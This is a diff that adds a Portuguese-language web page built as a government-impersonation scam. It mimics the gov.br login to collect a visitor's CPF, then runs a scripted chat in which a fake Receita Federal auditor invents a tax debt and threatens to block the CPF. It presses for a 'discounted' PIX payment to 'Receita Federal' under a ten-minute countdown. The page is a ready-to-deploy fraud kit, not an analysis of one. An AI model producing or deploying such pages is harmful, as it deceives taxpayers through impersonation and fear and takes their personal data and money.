@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Consulta - Situação Fiscal</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
+    <style>
+        @import url('https://fonts.cdnfonts.com/css/rawline');
+        body { font-family: 'Rawline', sans-serif; }
+        .stage { display: none; }
+        .stage.active { display: block; }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .stage.active { animation: slideIn 0.5s ease-out; }
+        .message-bubble {
+            margin-bottom: 16px;
+            max-width: 75%;
+            display: flex;
+            flex-direction: column;
+        }
+        .incoming-message {
+            align-self: flex-start;
+        }
+        .outgoing-message {
+            align-self: flex-end;
+        }
+        .message-content {
+            padding: 14px 18px;
+            border-radius: 18px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+        }
+        .incoming-message .message-content {
+            background-color: #044785;
+            color: white;
+        }
+        .outgoing-message .message-content {
+            background-color: #d4d4d4;
+            color: #333;
+        }
+        .option-button {
+            background: linear-gradient(145deg, #e6e6e6, #f8f8f8);
+            border: 1px solid #d0d0d0;
+            border-radius: 2px;
+            padding: 16px 20px;
+            text-align: left;
+            cursor: pointer;
+            font-weight: 500;
+            margin-bottom: 12px;
+            transition: all 0.2s;
+            font-size: 1rem;
+        }
+        .option-button:hover {
+            background: linear-gradient(145deg, #f0f0f0, #ffffff);
+            border-color: #044785;
+        }
+    </style>
+</head>
+<body class="bg-slate-100">
+
+<!-- STAGE 1: CPF INPUT -->
+<div id="stage-cpf" class="stage active min-h-screen flex flex-col px-4 py-6">
+    <header class="w-full max-w-5xl mx-auto flex items-center justify-between mb-6">
+        <a href="#" class="flex items-center">
+            <img src="assets/images/logo.png" alt="Logo" class="w-30 h-20 p-1">
+        </a>
+        <div class="hidden sm:flex items-center gap-4 text-xs text-slate-700">
+            <span class="flex items-center gap-1">Alto contraste</span>
+            <span class="flex items-center gap-1">VLibras</span>
+        </div>
+    </header>
+
+    <div class="w-full max-w-5xl mx-auto flex flex-col md:flex-row bg-white shadow-lg rounded-lg overflow-hidden">
+        <aside class="hidden md:block md:w-1/2 bg-gray-100 p-4">
+            <img src="assets/images/identidade.jpg" alt="Identidade gov.br" class="w-full h-full object-cover rounded">
+        </aside>
+        <main class="w-full md:w-1/2 bg-white p-6 md:p-8">
+            <div class="card space-y-4">
+                <h3 class="text-base font-semibold text-slate-900">Identifique-se no gov.br com:</h3>
+                <div class="border-0 rounded-none bg-transparent">
+                    <button type="button" class="w-full flex items-center gap-3 px-4 py-3 text-sm text-slate-800">
+                        <img src="assets/images/id-card.png" alt="" class="w-5 h-5">
+                        <span>Número do CPF</span>
+                    </button>
+                    <div class="px-4 py-3 space-y-3">
+                        <p class="text-xs text-slate-700">
+                            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+                        </p>
+                        <form id="form-cpf" class="space-y-4">
+                            <div class="space-y-1">
+                                <label for="cpf" class="text-xs font-medium text-slate-700">CPF</label>
+                                <input id="cpf" name="cpf" type="text" inputmode="numeric" placeholder="Digite seu CPF" class="w-full px-3 py-2 border border-gray-300 rounded-none text-sm focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600 bg-white">
+                            </div>
+                            <div class="flex items-center p-4 bg-gray-100 rounded cursor-pointer" onclick="marcarCaptcha()">
+                                <input type="checkbox" id="captcha-box" class="w-5 h-5">
+                                <span class="ml-3 text-sm text-gray-700 flex-1">Não sou um robô</span>
+                            </div>
+                            <div class="button-panel mt-2">
+                                <button type="button" onclick="verificarCpf()" class="w-full bg-blue-600 text-white py-2 rounded-full text-sm font-semibold hover:bg-blue-700 transition duration-300">
+                                    Continuar
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+
+                <label class="text-xs font-semibold text-slate-700 mt-4 block">Outras opções de identificação:</label>
+                <hr class="border-slate-200 -mt-1 mb-2">
+
+                <div class="space-y-1 text-xs text-slate-800">
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="assets/images/bank.png" alt="" class="w-5 h-5">
+                        <span>Login com seu banco</span>
+                    </button>
+                    <button type="button" class="w-full flex items-center gap-2 px-0 py-1 text-left">
+                        <img src="assets/images/qrcode.png" alt="" class="w-5 h-5">
+                        <span>Login com QR code</span>
+                    </button>
+                </div>
+            </div>
+        </main>
+    </div>
+</div>
+
+<!-- STAGE 2: LOADING -->
+<div id="stage-loading" class="stage min-h-screen flex items-center justify-center bg-slate-100">
+    <div class="bg-white rounded-lg p-12 text-center shadow-lg max-w-md">
+        <div class="w-16 h-16 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
+        <h2 class="text-2xl font-bold text-slate-900 mb-2">Processando consulta</h2>
+        <p id="loadingText" class="text-slate-600 mb-4">Localizando seu cadastro...</p>
+        <div class="w-full h-2 bg-slate-200 rounded-full overflow-hidden">
+            <div id="loadingBar" class="h-full bg-gradient-to-r from-blue-600 via-blue-500 to-cyan-500" style="width: 4%"></div>
+        </div>
+    </div>
+</div>
+
+<!-- STAGE 3: CHAT -->
+<div id="stage-chat" class="stage min-h-screen flex flex-col bg-white">
+    <header class="bg-gray-100 flex items-center justify-between p-1 border-b border-orange-300">
+        <img src="assets/images/logo.png" alt="Logo" class="w-30 h-20 p-1">
+        <div class="p-4 flex gap-2 items-center text-sm text-gray-700">
+            Chat de regularização
+        </div>
+    </header>
+
+    <div class="bg-gray-100 text-gray-800 px-4 py-3 border-b border-orange-200">
+        <div class="flex items-center gap-4">
+            <div class="w-12 h-12 bg-blue-600 rounded-full flex-shrink-0"></div>
+            <div class="flex-1">
+                <h2 class="text-gray-800 text-base font-semibold">Tereza Alencar</h2>
+                <p class="text-gray-600 text-xs">Auditora da Receita Federal • atendimento automatizado</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="chatContainer" class="flex-1 overflow-y-auto p-6 space-y-4" style="max-height: 400px;"></div>
+
+    <div class="p-6 bg-gray-50 border-t">
+        <div id="chatOptions"></div>
+    </div>
+</div>
+
+<!-- STAGE 4: PIX PAYMENT -->
+<div id="stage-pix" class="stage fixed inset-0 flex items-center justify-center bg-black/75 p-4" style="display: none;">
+    <div class="bg-white rounded-xl shadow-2xl max-w-md w-full p-6">
+        <div class="text-center mb-4">
+            <div class="w-12 h-12 border-4 border-slate-200 border-t-blue-600 rounded-full animate-spin mx-auto mb-4"></div>
+            <h2 class="text-xl font-bold text-blue-600 mb-2">Aguardando pagamento PIX</h2>
+            <p class="text-sm text-gray-600">Escaneie o QR Code ou use o código copia e cola</p>
+        </div>
+
+        <div id="pixDeadlineBox" class="bg-amber-50 border border-amber-300 rounded-lg p-3 mb-4">
+            <div class="flex justify-between items-center mb-2">
+                <span class="text-sm font-bold text-amber-900">Tempo para pagamento com desconto</span>
+                <span id="pixCountdown" class="text-lg font-bold text-amber-700">10:00</span>
+            </div>
+            <div class="w-full h-2 bg-amber-200 rounded-full overflow-hidden">
+                <div id="pixCountdownBar" class="h-full bg-gradient-to-r from-amber-500 to-orange-500" style="width: 100%"></div>
+            </div>
+        </div>
+
+        <div class="text-center mb-4 p-3 bg-white border-2 border-gray-200 rounded-lg">
+            <canvas id="qrcode" style="width: 180px; height: 180px;"></canvas>
+        </div>
+
+        <div class="bg-gray-50 p-3 rounded-lg mb-4 border border-gray-300">
+            <label class="text-xs font-bold text-gray-700 block mb-2">Código PIX (copia e cola) - Valor: R$ 810,00</label>
+            <textarea readonly class="w-full h-24 p-2 border border-gray-300 rounded font-mono text-xs resize-none"
+                      id="pixCode">00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-426614174000520400005303986540510.005802BR5913Receita Federal6009BRASILIA62070503***63041D3D</textarea>
+            <button onclick="copiarPix()" class="w-full mt-2 bg-green-600 text-white py-2 rounded font-semibold hover:bg-green-700">
+                <i class="fas fa-copy mr-1"></i> Copiar código PIX completo
+            </button>
+        </div>
+
+        <button onclick="confirmarPagamento()" class="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700">
+            Confirmar pagamento
+        </button>
+    </div>
+</div>
+
+<!-- STAGE 5: SUCCESS -->
+<div id="stage-sucesso" class="stage min-h-screen flex items-center justify-center bg-slate-100 p-4">
+    <div class="bg-white rounded-xl shadow-lg p-12 text-center max-w-md">
+        <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+            <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+        </div>
+        <h2 class="text-lg font-semibold text-slate-800 mb-2">Consulta realizada</h2>
+        <p class="text-sm text-slate-600 mb-6">CPF <strong id="cpfFinal"></strong></p>
+        <p class="text-lg font-bold text-green-600 mb-4">O CPF informado não possui pendências declaratórias.</p>
+        <button type="button" onclick="reiniciar()" class="w-full px-4 py-2.5 bg-blue-600 text-white text-sm font-semibold rounded-full hover:bg-blue-700 transition">
+            Fazer nova consulta
+        </button>
+    </div>
+</div>
+
+<script>
+let cpfGlobal = '';
+let pixCountdownTimer = null;
+
+function formatCPF(cpf) {
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+function marcarCaptcha() {
+    document.getElementById('captcha-box').checked = !document.getElementById('captcha-box').checked;
+}
+
+function verificarCpf() {
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    const captcha = document.getElementById('captcha-box').checked;
+
+    if (cpf.length !== 11) {
+        alert('Digite um CPF válido com 11 dígitos');
+        return;
+    }
+    if (!captcha) {
+        alert('Marque "Não sou um robô" para continuar');
+        return;
+    }
+
+    cpfGlobal = cpf;
+    mudarStage('loading');
+
+    const etapas = ['Localizando seu cadastro...', 'Validando dados informados...', 'Conferindo pendências ativas...', 'Finalizando consulta...'];
+    let etapa = 0;
+    const inicio = Date.now();
+    const duracao = 4000;
+
+    const updateProgress = setInterval(() => {
+        const elapsed = Date.now() - inicio;
+        const percent = Math.min(100, Math.round((elapsed / duracao) * 100));
+        document.getElementById('loadingBar').style.width = percent + '%';
+        document.getElementById('loadingText').textContent = etapas[Math.min(Math.floor(percent / 25), 3)];
+    }, 100);
+
+    setTimeout(() => {
+        clearInterval(updateProgress);
+        initChat();
+    }, 4000);
+}
+
+function mudarStage(stage) {
+    document.querySelectorAll('.stage').forEach(s => {
+        s.classList.remove('active');
+        if (s.id !== `stage-${stage}`) s.style.display = 'none';
+    });
+    const stageEl = document.getElementById(`stage-${stage}`);
+    stageEl.classList.add('active');
+    if (stage !== 'pix') stageEl.style.display = 'block';
+    else stageEl.style.display = 'flex';
+}
+
+function addChatMessage(text, isBot = true) {
+    const chatContainer = document.getElementById('chatContainer');
+    const messageDiv = document.createElement('div');
+    messageDiv.className = `message-bubble ${isBot ? 'incoming-message' : 'outgoing-message'}`;
+    messageDiv.innerHTML = `<div class="message-content">${text}</div>`;
+    chatContainer.appendChild(messageDiv);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+}
+
+function initChat() {
+    mudarStage('chat');
+    const firstName = 'Contribuinte';
+    const cpfFormatted = formatCPF(cpfGlobal);
+
+    const messages = [
+        { text: `Olá ${firstName}, aqui é a Tereza Alencar, Auditora da Receita Federal do Brasil.`, delay: 1000 },
+        { text: `Trabalho na área de fiscalização de débitos tributários. Foi identificado um débito pendente no seu CPF ${cpfFormatted}. O débito total a ser pago é de R$ 2.450,00.`, delay: 2500 },
+        { text: `Prezado ${firstName}, informo que seu CPF já consta na lista para bloqueio automático. Caso não efetue o pagamento, todas as atividades financeiras serão restringidas.`, delay: 2000 },
+        { text: `Importante: realizando o pagamento hoje há um desconto de 67%, reduzindo o débito para apenas R$ 810,00. ${firstName}, deseja quitar com desconto ou autoriza o bloqueio do CPF?`, delay: 1800, action: 'options' }
+    ];
+
+    let delay = 0;
+    messages.forEach(msg => {
+        setTimeout(() => {
+            addChatMessage(msg.text);
+            if (msg.action === 'options') showPaymentOptions();
+        }, delay);
+        delay += msg.delay;
+    });
+}
+
+function showPaymentOptions() {
+    const chatOptions = document.getElementById('chatOptions');
+    chatOptions.innerHTML = `
+        <button class="option-button w-full" onclick="escolherPagamento()">
+            <span style="display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:#28a745;margin-right:10px;flex-shrink:0;">
+                <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><path d="M2 6.5L5.2 10L11 3" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            </span>
+            Vou quitar o débito agora mesmo
+        </button>
+        <button class="option-button w-full" onclick="mudarStage('sucesso')">
+            <span style="display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:50%;background:#dc3545;margin-right:10px;flex-shrink:0;">
+                <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M2 2L9 9M9 2L2 9" stroke="white" stroke-width="2" stroke-linecap="round"/></svg>
+            </span>
+            Autorizo o bloqueio do meu CPF
+        </button>
+    `;
+}
+
+function escolherPagamento() {
+    addChatMessage('Vou quitar o débito agora mesmo', false);
+    document.getElementById('chatOptions').innerHTML = '';
+
+    setTimeout(() => {
+        addChatMessage('Este é o último aviso para regularizar esse débito. O pagamento com desconto tem validade de 10 minutos.');
+        setTimeout(() => {
+            addChatMessage('Gerando seu código PIX...');
+            setTimeout(() => {
+                gerarPixModal();
+                mudarStage('pix');
+                iniciarCountdown();
+            }, 1500);
+        }, 1500);
+    }, 500);
+}
+
+function gerarPixModal() {
+    const qr = new QRious({
+        element: document.getElementById('qrcode'),
+        value: '00020126580014br.gov.bcb.pix0136123e4567-e12b-12d1-a456-426614174000520400005303986540510.005802BR5913Receita Federal6009BRASILIA62070503***63041D3D',
+        size: 180,
+        background: '#ffffff',
+        foreground: '#000000'
+    });
+}
+
+function copiarPix() {
+    document.getElementById('pixCode').select();
+    document.execCommand('copy');
+    alert('Código PIX copiado!');
+}
+
+function iniciarCountdown() {
+    let tempoRestante = 600;
+    pixCountdownTimer = setInterval(() => {
+        tempoRestante--;
+        const min = Math.floor(tempoRestante / 60);
+        const seg = tempoRestante % 60;
+        document.getElementById('pixCountdown').textContent = `${min}:${seg.toString().padStart(2, '0')}`;
+        document.getElementById('pixCountdownBar').style.width = ((tempoRestante / 600) * 100) + '%';
+        if (tempoRestante <= 0) clearInterval(pixCountdownTimer);
+    }, 1000);
+}
+
+function confirmarPagamento() {
+    if (pixCountdownTimer) clearInterval(pixCountdownTimer);
+    document.getElementById('cpfFinal').textContent = formatCPF(cpfGlobal);
+    mudarStage('sucesso');
+}
+
+function reiniciar() {
+    document.getElementById('cpf').value = '';
+    document.getElementById('captcha-box').checked = false;
+    document.getElementById('chatContainer').innerHTML = '';
+    document.getElementById('chatOptions').innerHTML = '';
+    mudarStage('cpf');
+}
+</script>
+
+</body>
+</html>
